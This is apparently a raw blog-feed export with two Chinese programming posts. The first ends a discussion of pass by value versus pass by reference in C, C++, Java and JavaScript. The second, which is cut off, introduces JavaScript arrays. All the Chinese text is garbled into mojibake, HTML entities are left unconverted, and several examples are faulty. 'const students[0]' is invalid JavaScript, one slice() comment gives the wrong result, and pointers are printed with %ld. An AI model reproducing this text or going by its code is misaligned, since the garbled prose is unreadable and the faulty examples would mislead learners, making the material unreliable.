#include &lt;stdio.h&gt;  void swap(int *a, int *b) &#123;    // å°å‡º a è·Ÿ b æ‰€å­˜çš„å€¼  printf(&quot;%ld, %ld&quot;, a, b); //0x44, 0x40  int temp = *b;  *b = *a;  *a = temp;&#125;  int main()&#123;  int x = 10;  int y = 20;      // å…©å€‹æŒ‡æ¨™æŒ‡å‘ x è·Ÿ y  int* ptr_x = &amp;x;  int* ptr_y = &amp;y;    // å°å‡º x è·Ÿ y çš„è¨˜æ†¶é«”ä½ç½®ï¼ˆå°±æ˜¯ ptr_x è·Ÿ ptr_y å­˜çš„å€¼ï¼‰  printf(&quot;%ld %ld\n&quot;, ptr_x, ptr_y); // 0x44, 0x40  swap(ptr_x, ptr_y); // å‚³è¨˜æ†¶é«”ä½ç½®é€²å»  printf(&quot;%d %d\n&quot;, x, y); // 20, 10&#125;


é‚„è¨˜å¾—å‰é¢èªªéçš„ call by value çš„å®šç¾©å—ï¼Ÿå°±æ˜¯æŠŠè®Šæ•¸çš„å€¼è¤‡è£½ä¸€ä»½å‚³é€²å»ã€‚é€™é‚Šä¹Ÿæ˜¯ä¸€æ¨£çš„ï¼Œæˆ‘å€‘å‚³é€²å»çš„å…©å€‹è®Šæ•¸ptr_xè·Ÿptr_yå„²å­˜äº†xè·Ÿyçš„è¨˜æ†¶é«”ä½ç½®ï¼Œè€Œæˆ‘å€‘åœ¨å‘¼å« function çš„æ™‚å€™å°±æŠŠé€™å…©å€‹ã€Œå€¼ã€çµ¦è¤‡è£½ä¸€ä»½å‚³é€²å»ï¼Œæ‰€ä»¥ function è£¡é¢çš„aè·Ÿbå°å‡ºä¾†çš„å€¼å°±æœƒè·Ÿptr_xä»¥åŠptr_yå­˜çš„å€¼ä¸€æ¨£ã€‚
ç°¡å–®ä¾†èªªå°±æ˜¯ä»¥å‰æˆ‘å€‘ call by value çš„ã€Œvalueã€å¯èƒ½æ˜¯æ•¸å­—ï¼Œå¯èƒ½æ˜¯å­—ä¸²ï¼Œè€Œç¾åœ¨çš„ç¯„ä¾‹é€™å€‹ value æ˜¯ã€Œè¨˜æ†¶é«”ä½ç½®ã€ï¼Œä¹Ÿæ˜¯è³‡æ–™å‹æ…‹çš„ä¸€ç¨®ã€‚
ä¸éï¼Œä¹Ÿæœ‰äººæŠŠé€™æ¨£å­ç¨±ç‚º call by pointer æˆ–æ˜¯ call by addressï¼Œä½†åŸå‰‡ä¸Šéƒ½æ˜¯ call by value çš„ä¸€ç¨®ã€‚
åœ¨é€™é‚Šé‚„æœ‰ä¸€å€‹å¯ä»¥ç‰¹åˆ¥æ³¨æ„çš„åœ°æ–¹ï¼Œé‚£å°±æ˜¯å„˜ç®¡aè·Ÿptr_xçš„ã€Œå€¼ã€ä¸€æ¨£ï¼Œä½†é€™å…©å€‹é‚„æ˜¯ä¸ä¸€æ¨£çš„è®Šæ•¸ï¼Œæœ‰è‘—ä¸åŒçš„è¨˜æ†¶é«”ä½ç½®ã€‚
å†ä¾†æˆ‘å€‘çœ‹ C++ ä¸­çš„ call by reference åˆ°åº•æ˜¯æ€æ¨£ï¼Œåªè¦åœ¨ function çš„å¼•æ•¸é‚£è£¡åŠ ä¸Š&amp;ï¼Œå°±æœƒè®Šæˆ call by referenceï¼š
#include &lt;stdio.h&gt;  // æ³¨æ„åˆ°é€™é‚Šå¤šäº† &amp;ï¼Œå…¶ä»–éƒ½è·Ÿ call by value ä¸€æ¨¡ä¸€æ¨£void swap(int &amp;a, int &amp;b) &#123;    // å°å‡º a è·Ÿ b æ‰€å­˜çš„å€¼èˆ‡è¨˜æ†¶é«”ä½ç½®  printf(&quot;%ld, %ld\n&quot;, a, b); // 10, 20  printf(&quot;%ld, %ld\n&quot;, &amp;a, &amp;b); // 0x44, 0x40  int temp = b;  b = a;  a = temp;&#125;  int main()&#123;  int x = 10;  int y = 20;    // å°å‡º x è·Ÿ y çš„è¨˜æ†¶é«”ä½ç½®  printf(&quot;%ld %ld\n&quot;, &amp;x, &amp;y); // 0x44, 0x40  swap(x, y); // å‚³è¨˜æ†¶é«”ä½ç½®é€²å»  printf(&quot;%d %d\n&quot;, x, y); // 20, 10&#125;

åœ¨é€™è£¡aè·Ÿbçš„è¨˜æ†¶é«”ä½ç½®èˆ‡xè·Ÿyä¸€æ¨¡ä¸€æ¨£ï¼Œèªªæ˜äº†åœ¨è£¡é¢æ“ä½œaé€™å€‹è®Šæ•¸çš„æ™‚å€™ï¼Œå°±æ˜¯åœ¨æ“ä½œxé€™å€‹è®Šæ•¸ï¼Œå…©è€…æ˜¯ä¸€æ¨¡ä¸€æ¨£çš„ï¼Œåªæ˜¯æœ‰äº†ä¸åŒçš„åç¨±ã€‚ç•¶aé‡æ–°è³¦å€¼çš„æ™‚å€™ï¼Œä¹Ÿæœƒä¸€ä½µæŠŠå¤–é¢xçš„å€¼ä¸€èµ·æ”¹æ‰ã€‚
çœ‹å®Œäº† C è·Ÿ C++ è£¡é¢ pass by value è·Ÿ pass by reference çš„å€åˆ¥ï¼Œæˆ‘é–‹é ­çš„ç–‘æƒ‘ï¼šã€Œå¦‚æœä½ è¦å¾åº•å±¤å¯¦ä½œçš„åŸç†ä¾†çœ‹ï¼Œé‚£ call by reference ä¸ä¹Ÿæ˜¯ call by value çš„ä¸€ç¨®å—ï¼Ÿã€å°±è¢«è§£æ±ºäº†ã€‚
æˆ‘èªç‚ºé€™å…©å€‹æœ€å¤§çš„å·®ç•°å°±åœ¨æ–¼ä¸€ä»¶äº‹æƒ…ï¼šè¤‡è£½ã€‚
call by value æœƒæŠŠå‚³é€²å»çš„å€¼è¤‡è£½ï¼ˆç„¡è«–é‚£å€‹å€¼æ˜¯æ•¸å­—ä¹Ÿå¥½ï¼Œè¨˜æ†¶é«”ä½ç½®ä¹Ÿå¥½ï¼Œéƒ½æœƒè¤‡è£½ä¸€ä»½ï¼‰ï¼Œcall by reference åœ¨ã€Œæœ€åº•å±¤çš„å¯¦ä½œã€ä¸Šç•¶ç„¶ä¹Ÿæœƒæœ‰é¡ä¼¼çš„è¡Œç‚ºï¼Œä½†æ˜¯ä½ æ„Ÿè¦ºä¸å‡ºä¾†ã€‚
å°±åƒæˆ‘ä¸Šé¢ call by reference èˆ‰ä¾‹çš„é‚£æ®µç¨‹å¼ç¢¼ä¸€æ¨£ï¼Œxçš„è¨˜æ†¶é«”ä½ç½®è·Ÿaä¸€æ¨£ï¼Œyçš„è¨˜æ†¶é«”ä½ç½®è·Ÿbä¸€æ¨£ï¼Œå› æ­¤ä½ å¯ä»¥èªªä»–å€‘å…©è€…æ˜¯ã€Œä¸€æ¨¡ä¸€æ¨£ã€çš„æ±è¥¿ã€‚
å¯æ˜¯åœ¨ call by value çš„ç¯„ä¾‹ä¸­ï¼Œå°±ç®—ä½ å‚³çš„æ˜¯æŒ‡æ¨™å¥½äº†ï¼Œåªæœ‰ã€ŒæŒ‡æ¨™è£¡é¢å­˜çš„å€¼ï¼ˆä¹Ÿå°±æ˜¯æŒ‡åˆ°çš„è¨˜æ†¶é«”ä½ç½®ï¼‰ã€æ˜¯ä¸€æ¨£çš„ï¼Œä½†æŒ‡æ¨™æœ¬èº«é‚„æ˜¯æœ‰ä¸åŒçš„è¨˜æ†¶é«”ä½ç½®ã€‚
æ›å¥è©±èªªï¼Œåœ¨ call by value çš„æ™‚å€™æˆ‘å€‘æ˜¯ã€Œæ–°å»ºäº†ä¸€å€‹è®Šæ•¸aï¼Œä¸¦ä¸”è®“aå­˜çš„å€¼è·Ÿå‚³é€²ä¾†çš„åƒæ•¸ä¸€æ¨£ã€ã€‚åœ¨ call by reference çš„æ™‚å€™ï¼Œæˆ‘å€‘åªæ˜¯ã€Œè®“aä½œç‚ºxçš„ aliasï¼Œå…©å€‹æ˜¯åŒæ¨£çš„è®Šæ•¸ã€ï¼Œé€™æ˜¯æˆ‘èªç‚ºé€™å…©é–“ä¹‹é–“æœ€å¤§çš„å·®ç•°ã€‚
çµè«–æˆ‘å€‘å¾å„å€‹ç¨‹å¼èªè¨€è£¡é¢çœ‹åˆ°äº†æ¯ä¸€ç¨®ç¨‹å¼èªè¨€çš„å¯¦ç¾ï¼Œé‚£åˆ°åº•æœ‰æ²’æœ‰ä¸€ç¨®æ˜ç¢ºçš„å®šç¾©ï¼Œèƒ½å¤ å€åˆ† pass by value ä»¥åŠ pass by reference å‘¢ï¼Ÿ
æˆ‘æƒ³äº†æƒ³ï¼Œå…¶å¯¦å¯ä»¥å¾ã€Œè¡Œç‚ºã€ä¸Šé¢ä¾†åˆ¤åˆ¥åˆ°åº•æ˜¯å±¬æ–¼å“ªä¸€ç¨®ã€‚èˆ‡å…¶ç”±å®šç¾©ä¾†çœ‹ï¼Œä¸å¦‚ç›´æ¥å¾è¡Œç‚ºä¾†åŠ ä»¥å€åˆ†ï¼Œä¸åŒç¨®é¡èƒ½å¤ é”æˆçš„è¡Œç‚ºéƒ½ä¸ä¸€æ¨£ã€‚ç¬¬ä¸€å€‹æ¢ä»¶ç”¨ä¾†å€åˆ†åˆ°åº•æ˜¯ pass by value é‚„æ˜¯ pass by referenceï¼šã€Œåœ¨å‡½å¼è£¡å°å¼•æ•¸é‡æ–°è³¦å€¼ï¼Œå¤–é¢è®Šæ•¸æ˜¯å¦æœƒæ”¹è®Šï¼Ÿã€
ä»¥ JavaScript è·Ÿ Java ç‚ºä¾‹ï¼Œåœ¨å‡½å¼è£¡é¢é‡æ–°è³¦å€¼ï¼Œå¤–é¢çš„è®Šæ•¸éƒ½ä¸æœƒè®Šï¼Œæ‰€ä»¥å°±æ˜¯å±¬æ–¼ pass by valueã€‚
å¦‚æœä½ é‚„æƒ³åˆ†å¾—æ›´ç´°ï¼Œä¾†å¯ä»¥é€éç¬¬äºŒå€‹æ¢ä»¶ä¾†å€åˆ†é€™å€‹ pass by value æ˜¯çœŸãƒ»pass by value é‚„æ˜¯ä¸€å€‹å«åš pass by sharing çš„åˆ†æ”¯ï¼šã€Œèƒ½å¦é€éå¼•æ•¸ï¼Œæ”¹è®Šå¤–éƒ¨è®Šæ•¸çš„å€¼ã€ï¼ˆæˆ‘å€‘é€™é‚Šæ‰€æŒ‡çš„ã€Œå€¼ã€è·Ÿåœ°å€æˆ–å¼•ç”¨ç„¡é—œï¼Œç´”ç²¹åœ¨è¬›åƒ&#123;numer:1&#125;é€™æ¨£å­çš„å€¼ï¼‰
åœ¨ JavaScript è·Ÿ Java ä½ éƒ½å¯ä»¥é€éobj.number = 10ä¹‹é¡çš„æ“ä½œæ”¹è®Šå¤–éƒ¨è®Šæ•¸çš„å€¼ï¼ˆobj.number å¾ 1 è®Šæˆäº† 10ï¼‰ï¼Œæ‰€ä»¥ä¹Ÿèƒ½èªªæ˜¯ pass by sharingã€‚

æ ¹æ“šç¬¬ä¸€å€‹å®šç¾©ï¼šã€Œåœ¨å‡½å¼è£¡å°å¼•æ•¸é‡æ–°è³¦å€¼ï¼Œå¤–é¢è®Šæ•¸æ˜¯å¦æœƒæ”¹è®Šï¼Ÿã€ï¼Œæœ‰äººå¯èƒ½æœƒç™¼ç¾å¦‚æœæ˜¯ C è£¡é¢çš„æŒ‡æ¨™ï¼Œä¸æ˜¯ä¹Ÿå¯ä»¥é”æˆå—ï¼Ÿå¯æ˜¯ C åˆèªªåªæœ‰ call by valueï¼Œä¸å°±è¡çªäº†å—ï¼Ÿ
ä½†å…¶å¯¦åœ¨æŒ‡æ¨™çš„ç¯„ä¾‹è£¡é¢ï¼Œæˆ‘å€‘é‡æ–°è³¦å€¼çš„å°è±¡æ˜¯*aè€Œä¸æ˜¯aï¼ˆæ„æ€å°±æ˜¯ï¼Œæˆ‘å€‘æ˜¯è®“*a=10è€Œä¸æ˜¯a=10ï¼‰ï¼Œä½†å¾Œè€…æ‰å«å°å¼•æ•¸é‡æ–°è³¦å€¼ï¼ˆçµ¦aä¸€å€‹æ–°çš„åœ°å€ï¼‰ï¼Œå‰è€…æ˜¯ã€Œå°æŒ‡æ¨™æ‰€æŒ‡å‘çš„è¨˜æ†¶é«”ä½ç½®é‡æ–°è³¦å€¼ã€ã€‚æ‰€ä»¥ç…§é€™å€‹å®šç¾©ä¾†çœ‹ï¼ŒæŒ‡æ¨™çš„ç¯„ä¾‹ä¾èˆŠæ˜¯ pass by valueã€‚
ä¾æ“šç´°åˆ†ç¨‹åº¦çš„ä¸åŒï¼Œä¸‹é¢å¹¾å¥è©±éƒ½æ˜¯æ­£ç¢ºçš„ï¼š

JavaScript è£¡é¢åªæœ‰ pass by value
JavaScript çš„ primitive type æ˜¯ pass by valueï¼Œobject æ˜¯ pass by sharing

å¿ƒå¾—èªªå¯¦åœ¨çš„ï¼Œå…¶å¯¦æˆ‘æŸ¥äº†é€™éº¼ä¸€å¤§å †è³‡æ–™ä¹‹å¾Œï¼Œç™¼ç¾å¤§å®¶å° call by reference ä»¥åŠ call by value çš„ã€Œå®šç¾©ã€å…¶å¯¦éƒ½ä¸ç›¡ç›¸åŒï¼Œè€Œä¸”ä¹Ÿæ²’æœ‰ä¸€å€‹æ¬Šå¨æ€§çš„å‡ºè™•èƒ½å¤ ä¿è­‰é€™å€‹å®šç¾©æ˜¯æ­£ç¢ºçš„ï¼ˆæˆ–è¨±æœ‰ä½†æˆ‘æ²’æ‰¾åˆ°ï¼Œå¦‚æœä½ çŸ¥é“çš„è©±è«‹ä¸€å®šè¦å‘Šè¨´æˆ‘åœ¨å“ªè£¡ï¼Œæ‹œè¨—ï¼‰ï¼Œæ‰é€ æˆé€™éº¼å¤šçš„æ­§ç•°æ€§ã€‚
æœ‰é—œæŠ€è¡“åè©çš„è§£é‡‹ï¼Œæˆ‘æœ€å–œæ­¡å¼•ç”¨é€™ç¯‡ï¼šæŠ€è¡“åè©ç´›çˆ­å¤šï¼š

ç¨‹å¼é–‹ç™¼çš„ä¸–ç•Œä¸­ï¼Œåè©çš„å‰µé€ ç¶“å¸¸æ˜¯éš¨æ„çš„ï¼Œæ›¾ç¶“åœ¨ Java ä¸­çˆ­åŸ·ä¸æ–·çš„è€ƒå¤é¡Œä¹‹ä¸€æ˜¯ï¼šã€ŒJava ä¸­æœ‰æ²’æœ‰ Pass by referenceã€ï¼Œå°±ç¾ä»Šä¾†èªªï¼Œå¤§å®¶å…¬èªçš„ç­”æ¡ˆæ˜¯æ²’æœ‰ï¼ŒJava åªæœ‰ Pass by valueï¼Œä¸éé‚„æ˜¯æœ‰äººé¢å° Java æ–‡ä»¶ä¸­ç¶“å¸¸å‡ºç¾ referenceï¼Œè€Œæä¸æ¸…æ¥šã€‚


èªªç©¿äº†ï¼Œé€™å€‹åè©èˆ‡ C++ ä¸­çš„ reference å®šç¾©ä¸åŒï¼Œåªä¸é Java æœ€åˆä¸çŸ¥é“ç‚ºä»€éº¼ï¼Œä¹Ÿç”¨äº† reference ä¸€è©ï¼Œé‡é»ä¹Ÿä¸åœ¨ææ¸…æ¥š Pass by valueï¼Œé‡é»æ˜¯ææ¸…æ¥šé€éåƒæ•¸æ“ä½œç‰©ä»¶æ™‚ï¼Œæœƒæœ‰ä»€éº¼æ¨£çš„è¡Œç‚ºã€‚

æˆ‘å€‘å¾ JavaScript ç ”ç©¶åˆ° Javaï¼Œå†å¾ Java ç ”ç©¶åˆ° C èˆ‡ C++ï¼Œç‚ºçš„å°±æ˜¯æƒ³è¦ææ¸…æ¥šã€Œpass by referenceã€çš„å®šç¾©ç‚ºä½•ï¼Œä½†è¿½æ ¹ç©¶åº•ï¼Œæœƒé€ æˆé€™æ¨£å­çš„èª¤æœƒæ˜¯å› ç‚ºå°æ–¼ã€Œreferenceã€ä¸€è©çš„å®šç¾©ä¸åŒã€‚
å¦‚æœä½ æŠŠ pass by reference ç†è§£æˆåƒ C++ é‚£æ¨£å­çš„å®šç¾©ï¼Œé‚£ Java è·Ÿ JavaScript éƒ½ä¸æœƒæœ‰ pass by referenceã€‚ä½†å¦‚æœä½ æŠŠ pass by reference çš„ã€Œreferenceã€ç†è§£æˆã€Œå°æ–¼ç‰©ä»¶çš„åƒè€ƒã€ï¼Œé‚£ JavaScript æŠŠ object å‚³é€²å»ï¼Œå…¶å¯¦å°±æ˜¯æŠŠã€Œå°ç‰©ä»¶çš„åƒè€ƒã€å‚³é€²å»ï¼Œé‚£å°±å¯ä»¥è§£é‡‹æˆæ˜¯ pass by referenceã€‚
éƒ½æ˜¯ reference é€™å€‹åè©å¤ªå¥½ç”¨äº†ï¼Œå°è‡´ä¸åŒåœ°æ–¹æœ‰ä¸åŒçš„å®šç¾©ï¼Œä½†é‚£äº›å®šç¾©å¾€å¾€ç›¸ä¼¼å»åˆä¸å…¨ç„¶ç›¸åŒã€‚
å¯æ˜¯åˆ¥å¿˜äº†ï¼Œé‡é»å…¶å¯¦ä¸åœ¨é€™å€‹ï¼Œè€Œæ˜¯ææ¸…æ¥šåˆ°åº•åƒæ•¸åœ¨æ“ä½œçš„æ™‚å€™æœƒæœ‰æ€æ¨£çš„è¡Œç‚ºã€‚ä½ è¦çŸ¥é“ JavaScript å‚³ object é€²å»çš„æ™‚å€™ï¼Œå¯ä»¥æ›´æ”¹åŸæœ¬ç‰©ä»¶çš„å€¼ï¼Œä½†é‡æ–°è³¦å€¼ä¸¦ä¸æœƒå½±éŸ¿åˆ°å¤–éƒ¨çš„ objectã€‚åªè¦çŸ¥é“é€™ä¸€é»ï¼Œå…¶ä»–çš„æˆ‘è¦ºå¾—éƒ½æ²’é‚£éº¼é‡è¦äº†ã€‚
é€™æ¬¡å¯«äº†ä¸€å€‹å¾ˆå®¹æ˜“å¼•æˆ°çš„ä¸»é¡Œï¼Œä½†ä¹Ÿè¦ºå¾—æ»¿æœ‰è¶£çš„ï¼Œå¦‚æœä½ å°é€™å•é¡Œæœ‰ä¸åŒçš„è¦‹è§£ï¼Œè¦ºå¾—æˆ‘æœ‰å“ªé‚Šå¯«éŒ¯çš„è©±ï¼Œæ­¡è¿æŒ‡æ­£ï¼Œæ„Ÿè¬ã€‚
åƒè€ƒè³‡æ–™
[Javascript] é—œæ–¼ JS ä¸­çš„æ·ºæ‹·è²å’Œæ·±æ‹·è²

[ç­†è¨˜] è«‡è«‡JavaScriptä¸­by referenceå’Œby valueçš„é‡è¦è§€å¿µ
é‡æ–°èªè­˜ JavaScript: Day 05 JavaScript æ˜¯ã€Œå‚³å€¼ã€æˆ–ã€Œå‚³å€ã€ï¼Ÿ
Re: [å•é¡Œ] è«‹å•å‚³åƒè€ƒåˆ°åº•æ˜¯ä»€éº¼?
ECMA-262-3 in detail. Chapter 8. Evaluation strategy.
ç°¡å–®ä»‹ç´¹JavaScriptåƒæ•¸å‚³é
JavaScript æ˜¯ä¼ å€¼è°ƒç”¨è¿˜æ˜¯ä¼ å¼•ç”¨è°ƒç”¨ï¼Ÿ
Values vs References semantics #160
You Donâ€™t Know JS: Types &amp; Grammar Chapter 2: Values

Parameter passing in Java - by reference or by value?
Is Java â€œpass-by-referenceâ€ or â€œpass-by-valueâ€?
å‚³å€¼å‘¼å«
Call by valueï¼Ÿ
javaä¸­çš„ç»å…¸é—®é¢˜ï¼šä¼ å€¼ä¸ä¼ å¼•ç”¨
Java is Pass-by-Value, Dammit!
11.2. By Value Versus by Reference

é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ JavaScript å­¸ç¿’è³‡æ–™çµæ§‹å’Œæ¼”ç®—æ³•ï¼šé™£åˆ—ï¼ˆArrayï¼‰ç¯‡</title>
    <url>/2016/10/08/javascript-data-structure-algorithm-array/</url>
    <content><![CDATA[
ä»€éº¼æ˜¯é™£åˆ—ï¼ˆArrayï¼‰ï¼Ÿé™£åˆ—å¯ä»¥èªªæ˜¯ç¨‹å¼èªè¨€ä¸­æš«æ™‚å„²å­˜è³‡æ–™çš„æ«ƒå­ï¼Œå¹¾ä¹æ‰€æœ‰çš„ç¨‹å¼èªè¨€éƒ½å…·å‚™é™£åˆ—é€™å€‹å»£æ³›é‹ç”¨çš„è³‡æ–™çµæ§‹ï¼Œä½†å€¼å¾—æ³¨æ„çš„æ˜¯ä¸€èˆ¬ç¨‹å¼èªè¨€ä¸­é™£åˆ—åªèƒ½å„²å­˜åŒæ¨£å‹åˆ¥çš„å€¼ï¼Œä½†åœ¨ JavaScript å‰‡å¯ä»¥å„²å­˜ä¸åŒå‹åˆ¥çš„å€¼ï¼ˆä½†æˆ‘å€‘é‚„æ˜¯ç›¡é‡é¿å…ï¼‰ã€‚
ä¸‹é¢æ˜¯é™£åˆ—çš„ç°¡å–®ä½¿ç”¨æƒ…å¢ƒï¼Œç•¶ä»Šå¤©æˆ‘å€‘æƒ³å„²å­˜æ•´å€‹ç­ç´šçš„å­¸ç”Ÿå§“åæ™‚ï¼Œæˆ‘å€‘ä¸å¯èƒ½ä½¿ç”¨ä¸€å€‹å€‹è®Šæ•¸å»ä¸€å€‹å€‹å„²å­˜ï¼Œé€™æ™‚å€™é™£åˆ—çš„åŠŸèƒ½å°±æ´¾ä¸Šç”¨å ´äº†ï¼š
const student1 = &#x27;Mark&#x27;;const student2 = &#x27;Zuck&#x27;;const student3 = &#x27;Woz&#x27;;const students[0] = &#x27;Mark&#x27;;const students[1] = &#x27;Zuck&#x27;;const students[2] = &#x27;Woz&#x27;;

é™£åˆ—åˆé«”é©—
æ¥ä¸‹ä¾†æˆ‘å€‘å°‡å¯¦éš›æ“ä½œé™£åˆ—ï¼Œè®“è®€è€…æ„Ÿå—ä¸€ä¸‹é™£åˆ—çš„ä½¿ç”¨æ–¹å¼ï¼š

å»ºç«‹å’Œåˆå§‹åŒ–é™£åˆ—
 åœ¨ JavaScript ä¸­å»ºç«‹é™£åˆ—ååˆ†å®¹æ˜“å’Œå½ˆæ€§ï¼Œä¸»è¦æœ‰å…©ç¨®æ–¹å¼ï¼š
 ä½¿ç”¨ new Array()ï¼Œå¯ä»¥è‡ªå®šé™£åˆ—å¤§å° 
 let newArray1 = new Array();let newArray2 = new Array(3);let students = new Array(&#x27;Mark&#x27;, &#x27;Zuck&#x27;);

 ä½¿ç”¨ [] å®£å‘Šé™£åˆ—ï¼Œç›¸å°å½ˆæ€§
 let newArray1 = [];let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;];

æ–°å¢ã€åˆªé™¤é™£åˆ—å…ƒç´ 
 åœ¨ JavaScript æœ‰è¨±å¤šå½ˆæ€§å¥½ç”¨çš„æ–°å¢åˆªé™¤é™£åˆ—çš„æ–¹æ³•ï¼Œæœ€ç°¡å–®çš„æ–°å¢æ–¹å¼å°±æ˜¯æŠŠå€¼ç›´æ¥è³¦å€¼çµ¦é™£åˆ—ä¸Šæœ€å¾Œä¸€å€‹å…ƒç´ ï¼š
 let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Pony&#x27;, &#x27;Elon&#x27;];// ç”±æ–¼é™£åˆ— index æ˜¯å¾ 0 é–‹å§‹ï¼Œä½¿ç”¨é™£åˆ—é•·åº¦ç•¶ index è³¦å€¼å°±æœƒæ–°å¢ä¸€å€‹å…ƒç´  students[students.length] = &#x27;Mary&#x27;;

 ä½¿ç”¨ push å¯ä»¥å°‡å…ƒç´ æ–°å¢åˆ°æœ€å¾Œï¼Œpop å¯ä»¥ç§»é™¤æœ€å¾Œé™£åˆ—å…ƒç´ ï¼š
 let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Pony&#x27;, &#x27;Elon&#x27;];// å°‡ Mary åŠ å…¥æœ€å¾Œå…ƒç´ students.push(&#x27;Mary&#x27;);// å°‡ Mary ç§»é™¤students.pop();

 æ•´å€‹ç§»å‹•é™£åˆ—å…ƒç´ ï¼Œä»¥ä¸‹ç¤ºç¯„æƒ³åœ¨é¦–ä½æ’å…¥å…ƒç´  12ï¼š
 let numbers = [1, 2, 3, 4];for(let i = numbers.length; i &gt;= 0; i--) &#123;	numbers[i] = numbers[i - 1];&#125;numbers[0] = 12;

 unshiftã€shift é™£åˆ—å¯ä»¥åˆ†åˆ¥å°‡æ•¸å€¼æ’å…¥é¦–ä½å’Œç§»é™¤é¦–ä½å…ƒç´ ï¼š
 let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Pony&#x27;, &#x27;Elon&#x27;];// å°‡ Mary æ’å…¥é¦–ä½students.unshift(&#x27;Mary&#x27;);// å°‡ Mary ç§»é™¤students.shift();

 ä½¿ç”¨ splice æ–¹æ³•å¯ä»¥æŒ‡å®š index å»æ–°å¢ã€åˆªé™¤å…ƒç´ ï¼š
 // splice(èµ·å§‹ index, åˆªé™¤å€‹æ•¸ï¼Œè‹¥ç‚º0å³ç‚ºæ’å…¥, æ¬²æ’å…¥å…ƒç´ 1, æ¬²æ’å…¥å…ƒç´ 2, æ¬²æ’å…¥å…ƒç´ N)let students = [&#x27;Mark&#x27;, &#x27;Zuck&#x27;, &#x27;Pony&#x27;, &#x27;Elon&#x27;];students.splice(0, 2); // students =&gt; [&#x27;Pony&#x27;, &#x27;Elon&#x27;]students.splice(1, 0, &#x27;John&#x27;, &#x27;Cath&#x27;); // students =&gt; [&#x27;Pony&#x27;, &#x27;John&#x27;, &#x27;Cath&#x27;, &#x27;Elon&#x27;];

äºŒç¶­é™£åˆ—äº‹å¯¦ä¸Šåœ¨ JavaScript ä¸­åªæ”¯æ´ä¸€ç¶­é™£åˆ—ï¼Œä½†æˆ‘å€‘å¯ä»¥ç”¨é™£åˆ—åµŒå¥—é™£åˆ—çš„æ–¹å¼ä¾†é”æˆå¤šç¶­é™£åˆ—ï¼š
// å­¸ç”Ÿå’Œä»–çš„æˆç¸¾let students = [];students[0] = [79, 74, 86];students[1] = [97, 54, 46];

åˆ—å°å‡ºçµæœï¼š
for(let i = 0; i &lt; students.length; i++) &#123;	for(let j = 0; j &lt; students[i].length; j++) &#123;		console.log(students[i][j]);	&#125;&#125;

ä»¥ä¸Šæ˜¯äºŒç¶­é™£åˆ—ä½œæ³•ï¼Œè‹¥æ˜¯å¤šç¶­å‰‡ä»¥æ­¤é¡æ¨ï¼Œä½†è¶Šå¤šç¶­ç¶­è­·èµ·è³‡æ–™è¶Šè¤‡é›œã€‚
å¸¸è¦‹é™£åˆ—æ–¹æ³•é™£åˆ—ç›¸ç•¶å½ˆæ€§ä¹ŸåŠŸèƒ½å¼·å¤§çš„ä¸€ç¨®è³‡æ–™çµæ§‹ï¼Œé™¤äº†ä¸Šé¢ä»‹ç´¹çš„æ–¹æ³•å¤–é‚„æ“æœ‰è¨±å¤šå¸¸ç”¨æ–¹æ³•ã€‚æˆ‘å€‘é€™è£¡ä¹Ÿå€Ÿç”¨ @tooto1985 æ‰€æ•´ç†çš„åœ–è§£ JavaScript é™£åˆ—æ“ä½œæ–¹æ³•é€²è¡Œè¬›è§£ï¼š

é™£åˆ—åˆä½µå’Œåˆ‡å‰²
concat
 é€£æ¥å…©å€‹æˆ–å¤šå€‹é™£åˆ—ä¸¦å›å‚³çµæœï¼š
 var hege = [&quot;Cecilie&quot;, &quot;Leo&quot;];var stale = [&quot;Emil&quot;, &quot;May&quot;, &quot;Linus&quot;];var children = hege.concat(stale);// [&#x27;Cecilie&#x27;, &#x27;Leo&#x27;, &#x27;Emil&#x27;, &#x27;May&#x27;, &#x27;Linus&#x27;]

slice
 å°‡ array åˆ‡ç‰‡ï¼Œå›å‚³æ–°çš„ arrayï¼š
 var fruits = [&#x27;Banana&#x27;, &#x27;Orange&#x27;, &#x27;Lemon&#x27;, &#x27;Apple&#x27;, &#x27;Raspberry&#x27;];var citrus = fruits.slice(1, 3); // [&#x27;Orange&#x27;, &#x27;Lemon&#x27;, &#x27;Apple&#x27;]	

join
 å°‡é™£åˆ—ç”¨åˆ†éš”ç¬¦è™Ÿï¼ˆseparatorï¼‰ä¸²èµ·ä¾†æˆå­—ä¸²
 var fruits = [&#x27;Banana&#x27;, &#x27;Orange&#x27;, &#x27;Lemon&#x27;, &#x27;Apple&#x27;, &#x27;Raspberry&#x27;];var citrus = fruits.join(); // é è¨­ä½¿ç”¨ , åˆ†éš”ï¼šBanana,Orange,Lemon,Apple,Raspberry		

é™£åˆ—è¿­ä»£
every
 å°é™£åˆ—æ¯å€‹å…ƒç´ éƒ½é€²è¡Œè¿­ä»£ï¼Œè‹¥è¿­ä»£å‡½æ•¸å…§å®¹çš†ç‚º trueï¼Œå‰‡å›å‚³ trueï¼Œåä¹‹å›å‚³ falseï¼š
 var ages = [32, 33, 16, 40];function checkAdult(age) &#123;    return (age &gt;= 18) ? true : false;&#125;console.log(ages.every(checkAdult)); // false

some
 èˆ‡ every çš„ç”¨æ³•é¡ä¼¼ï¼Œä½†ä¸åŒçš„æ˜¯è‹¥è¿­ä»£å‡½æ•¸ä¸­æœ‰ä¸€å€‹ç‚º true å³å›å‚³ trueï¼Œåä¹‹å›å‚³ falseï¼š
 var ages = [3, 10, 18, 20];function checkAdult(age) &#123;    return (age &gt;= 18) ? true : false;&#125;console.log(ages.some(checkAdult)); // true

map
 è¿­ä»£æ¯ä¸€å€‹é™£åˆ—å…ƒç´ ï¼š
 var numbers = [4, 9, 16, 25];numbers.map(function(value, index) &#123;	console.log(value, index);&#125;);

reduce
 ç”±å·¦åˆ°å³ç´¯åŠ ï¼ˆreduce æ–¹æ³•çš„åƒæ•¸å‡½æ•¸å…±æœ‰ previousValue, currentValue, index, array å››å€‹åƒæ•¸ï¼‰ï¼š
 var numbers = [65, 44, 12, 3];function getSum(total, num) &#123;    return total + num;&#125;numbers.reduce(getSum); // 124

reduceRight
